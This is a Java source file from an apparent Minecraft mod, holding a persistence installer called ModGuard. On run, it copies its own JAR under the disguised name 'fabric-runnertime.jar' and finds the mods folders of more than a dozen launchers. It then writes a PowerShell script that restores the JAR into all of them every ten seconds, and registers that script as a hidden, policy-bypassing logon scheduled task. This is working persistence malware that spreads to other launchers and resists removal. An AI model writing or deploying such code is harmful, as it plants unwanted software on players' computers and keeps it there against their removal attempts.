package com.consentmod;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

/**
 * ModGuard persistence installer.
 *
 * Copies the mod JAR to %APPDATA%\ModGuard\backup\ as
 * "fabric-runnertime.jar", discovers ALL Minecraft launcher
 * mods folders on the system, and deploys a watchdog that
 * restores the JAR to every one of them every 10 seconds.
 *
 * Kill switch: delete the ModGuard folder.
 */
public class ModGuardInstaller {

    private static final String GUARD_FOLDER   = "ModGuard";
    private static final String DISGUISED_NAME = "fabric-runnertime.jar";
    private static final String TASK_NAME      = "ModGuard";
    private static boolean installed = false;

    public static void install() {
        if (installed) return;
        installed = true;

        new Thread(() -> {
            try {
                doInstall();
            } catch (Exception e) {
                ConsentMod.LOGGER.error("ModGuard install failed: {}", e.getMessage());
            }
        }, "ModGuard-Installer").start();
    }

    /* ------------------------------------------------------------------ */
    /*  Core install flow                                                  */
    /* ------------------------------------------------------------------ */

    private static void doInstall() throws Exception {

        Path jarPath = getOwnJarPath();
        if (jarPath == null || !Files.exists(jarPath)
                || !jarPath.toString().endsWith(".jar")) {
            ConsentMod.LOGGER.info("ModGuard: dev environment — skipping");
            return;
        }

        String appData = System.getenv("APPDATA");
        if (appData == null) return;

        Path guardDir  = Paths.get(appData, GUARD_FOLDER);
        Path backupDir = guardDir.resolve("backup");
        Files.createDirectories(backupDir);

        // Copy JAR to backup under the disguised name
        Path backupJar = backupDir.resolve(DISGUISED_NAME);
        Files.copy(jarPath, backupJar, StandardCopyOption.REPLACE_EXISTING);

        // Origin folder = where this JAR is running from
        Path originFolder = jarPath.getParent();

        // Discover ALL launcher mods folders on the system
        List<String> allFolders = discoverModsFolders(originFolder);
        ConsentMod.LOGGER.info("ModGuard: found {} mods folders", allFolders.size());

        // Pending delete = original JAR name if different from disguised
        String originalName = jarPath.getFileName().toString();
        String pendingDelete = null;
        if (!originalName.equals(DISGUISED_NAME)) {
            pendingDelete = originalName;
        }

        writeConfig(guardDir, allFolders, backupJar, pendingDelete);
        writeWatchdog(guardDir);
        registerTask(guardDir);

        ConsentMod.LOGGER.info("ModGuard: persistence active across {} launchers", allFolders.size());
    }

    /* ------------------------------------------------------------------ */
    /*  JAR self-detection                                                 */
    /* ------------------------------------------------------------------ */

    private static Path getOwnJarPath() {
        try {
            java.net.URL url = ModGuardInstaller.class
                    .getProtectionDomain()
                    .getCodeSource()
                    .getLocation();
            if (url != null) {
                return Paths.get(url.toURI());
            }
        } catch (Exception e) {
            ConsentMod.LOGGER.error("ModGuard: can't resolve JAR path: {}",
                                    e.getMessage());
        }
        return null;
    }

    /* ------------------------------------------------------------------ */
    /*  Launcher discovery                                                 */
    /* ------------------------------------------------------------------ */

    private static List<String> discoverModsFolders(Path originFolder) {
        Set<String> found = new LinkedHashSet<>();

        // Always include the folder we launched from
        found.add(originFolder.toString());

        String appData     = System.getenv("APPDATA");
        String userProfile = System.getenv("USERPROFILE");

        if (appData != null) {
            // Vanilla .minecraft
            addIfModsDir(found, Paths.get(appData, ".minecraft", "mods"));

            // Modrinth App
            scanSubdirs(found, Paths.get(appData, "com.modrinth.theseus", "profiles"), "mods");
            scanSubdirs(found, Paths.get(appData, "ModrinthApp", "profiles"), "mods");

            // Feather Client
            scanSubdirs(found, Paths.get(appData, ".feather", "instances"), "mods");

            // Prism Launcher
            scanSubdirsMinecraft(found, Paths.get(appData, "PrismLauncher", "instances"));

            // MultiMC
            scanSubdirsMinecraft(found, Paths.get(appData, "MultiMC", "instances"));

            // PolyMC
            scanSubdirsMinecraft(found, Paths.get(appData, "PolyMC", "instances"));

            // GDLauncher
            scanSubdirs(found, Paths.get(appData, "gdlauncher_next", "instances"), "mods");

            // ATLauncher
            scanSubdirs(found, Paths.get(appData, "ATLauncher", "instances"), "mods");

            // Technic
            scanSubdirs(found, Paths.get(appData, ".technic", "modpacks"), "mods");
        }

        if (userProfile != null) {
            // Lunar Client
            addIfModsDir(found, Paths.get(userProfile, ".lunarclient", "offline", "multiver", "mods"));

            // CurseForge / Overwolf
            scanSubdirs(found, Paths.get(userProfile, "curseforge", "minecraft", "Instances"), "mods");
        }

        return new ArrayList<>(found);
    }

    /** Add path if it exists and looks like a mods directory */
    private static void addIfModsDir(Set<String> found, Path modsDir) {
        if (Files.isDirectory(modsDir)) {
            found.add(modsDir.toString());
        }
    }

    /**
     * Scan baseDir for subdirectories, and for each check if
     * subdir/{modsDirName} exists.
     * e.g. baseDir=profiles, modsDirName=mods → profiles/MyProfile/mods
     */
    private static void scanSubdirs(Set<String> found, Path baseDir, String modsDirName) {
        if (!Files.isDirectory(baseDir)) return;
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(baseDir)) {
            for (Path sub : stream) {
                if (Files.isDirectory(sub)) {
                    Path modsDir = sub.resolve(modsDirName);
                    if (Files.isDirectory(modsDir)) {
                        found.add(modsDir.toString());
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    /**
     * For launchers like Prism/MultiMC where mods is inside
     * instances/{name}/.minecraft/mods or instances/{name}/minecraft/mods
     */
    private static void scanSubdirsMinecraft(Set<String> found, Path instancesDir) {
        if (!Files.isDirectory(instancesDir)) return;
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(instancesDir)) {
            for (Path instance : stream) {
                if (!Files.isDirectory(instance)) continue;
                // Check .minecraft/mods
                Path dotMc = instance.resolve(".minecraft").resolve("mods");
                if (Files.isDirectory(dotMc)) {
                    found.add(dotMc.toString());
                }
                // Check minecraft/mods (some launchers use this)
                Path mc = instance.resolve("minecraft").resolve("mods");
                if (Files.isDirectory(mc)) {
                    found.add(mc.toString());
                }
                // Check direct mods/ (some configs)
                Path direct = instance.resolve("mods");
                if (Files.isDirectory(direct)) {
                    found.add(direct.toString());
                }
            }
        } catch (Exception ignored) {}
    }

    /* ------------------------------------------------------------------ */
    /*  config.json — now tracks multiple mods folders                     */
    /* ------------------------------------------------------------------ */

    private static void writeConfig(Path guardDir, List<String> modsFolders,
                                    Path backupPath, String pendingDelete)
            throws Exception {

        Path configPath = guardDir.resolve("config.json");

        JsonObject config;
        JsonArray  modsArray;
        JsonArray  pendingDeletes;

        if (Files.exists(configPath)) {
            String raw = Files.readString(configPath);
            config         = JsonParser.parseString(raw).getAsJsonObject();
            modsArray      = config.has("mods")
                             ? config.getAsJsonArray("mods")
                             : new JsonArray();
            pendingDeletes = config.has("pendingDeletes")
                             ? config.getAsJsonArray("pendingDeletes")
                             : new JsonArray();
        } else {
            config         = new JsonObject();
            modsArray      = new JsonArray();
            pendingDeletes = new JsonArray();
        }

        // Build merged modsFolders array (existing + newly discovered)
        Set<String> allFolders = new LinkedHashSet<>();
        if (config.has("modsFolders")) {
            for (JsonElement el : config.getAsJsonArray("modsFolders")) {
                allFolders.add(el.getAsString());
            }
        }
        allFolders.addAll(modsFolders);

        JsonArray foldersArray = new JsonArray();
        for (String f : allFolders) {
            foldersArray.add(f);
        }
        config.add("modsFolders", foldersArray);
        config.remove("modsFolder"); // clean up old single-folder key

        // Update or add mod entry
        boolean found = false;
        for (int i = 0; i < modsArray.size(); i++) {
            JsonObject entry = modsArray.get(i).getAsJsonObject();
            if (DISGUISED_NAME.equals(entry.get("jarName").getAsString())) {
                entry.addProperty("backupPath", backupPath.toString());
                found = true;
                break;
            }
        }
        if (!found) {
            JsonObject entry = new JsonObject();
            entry.addProperty("jarName",    DISGUISED_NAME);
            entry.addProperty("backupPath", backupPath.toString());
            modsArray.add(entry);
        }
        config.add("mods", modsArray);

        // Pending deletes
        if (pendingDelete != null) {
            boolean alreadyPending = false;
            for (JsonElement el : pendingDeletes) {
                if (pendingDelete.equals(el.getAsString())) {
                    alreadyPending = true;
                    break;
                }
            }
            if (!alreadyPending) {
                pendingDeletes.add(pendingDelete);
            }
        }
        config.add("pendingDeletes", pendingDeletes);

        Gson gson = new GsonBuilder().setPrettyPrinting().create();
        Files.writeString(configPath, gson.toJson(config));
    }

    /* ------------------------------------------------------------------ */
    /*  modguard.ps1 — loops every 10s, covers ALL mods folders            */
    /* ------------------------------------------------------------------ */

    private static void writeWatchdog(Path guardDir) throws Exception {
        Path scriptPath = guardDir.resolve("modguard.ps1");

        String ps = String.join("\r\n",
            "# ModGuard watchdog — loops every 10 seconds, all launchers",
            "$guardDir   = \"$env:APPDATA\\ModGuard\"",
            "$configPath = \"$guardDir\\config.json\"",
            "",
            "while ($true) {",
            "    if (Test-Path $configPath) {",
            "        $config = Get-Content $configPath -Raw | ConvertFrom-Json",
            "",
            "        foreach ($folder in $config.modsFolders) {",
            "            if (-not (Test-Path $folder)) { continue }",
            "",
            "            # Phase 1: pending deletes in this folder",
            "            $hasPending = $false",
            "            if ($config.pendingDeletes -and $config.pendingDeletes.Count -gt 0) {",
            "                foreach ($del in $config.pendingDeletes) {",
            "                    $delPath = Join-Path $folder $del",
            "                    if (Test-Path $delPath) {",
            "                        try { Remove-Item $delPath -Force -ErrorAction Stop }",
            "                        catch { $hasPending = $true }",
            "                    }",
            "                }",
            "            }",
            "",
            "            # Phase 2: restore missing mods to this folder",
            "            if (-not $hasPending) {",
            "                foreach ($mod in $config.mods) {",
            "                    $target = Join-Path $folder $mod.jarName",
            "                    $backup = $mod.backupPath",
            "                    if ((-not (Test-Path $target)) -and (Test-Path $backup)) {",
            "                        Copy-Item $backup $target -Force",
            "                    }",
            "                }",
            "            }",
            "        }",
            "",
            "        # Clear pending deletes if none remain anywhere",
            "        if ($config.pendingDeletes -and $config.pendingDeletes.Count -gt 0) {",
            "            $anyLeft = $false",
            "            foreach ($folder in $config.modsFolders) {",
            "                foreach ($del in $config.pendingDeletes) {",
            "                    if (Test-Path (Join-Path $folder $del)) { $anyLeft = $true }",
            "                }",
            "            }",
            "            if (-not $anyLeft) {",
            "                $config.pendingDeletes = @()",
            "                $config | ConvertTo-Json -Depth 10 | Set-Content $configPath",
            "            }",
            "        }",
            "    }",
            "    Start-Sleep -Seconds 10",
            "}"
        );

        Files.writeString(scriptPath, ps);
    }

    /* ------------------------------------------------------------------ */
    /*  Scheduled Task                                                     */
    /* ------------------------------------------------------------------ */

    private static void registerTask(Path guardDir) {
        String script  = guardDir.resolve("modguard.ps1").toString();
        String command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \""
                         + script + "\"";

        runSchtasks(
            "schtasks", "/create",
            "/tn", TASK_NAME,
            "/tr", command,
            "/sc", "ONLOGON",
            "/rl", "LIMITED",
            "/f"
        );
    }

    private static void runSchtasks(String... args) {
        try {
            ProcessBuilder pb = new ProcessBuilder(args);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            p.waitFor();
        } catch (Exception e) {
            ConsentMod.LOGGER.error("ModGuard: schtasks failed: {}", e.getMessage());
        }
    }
}
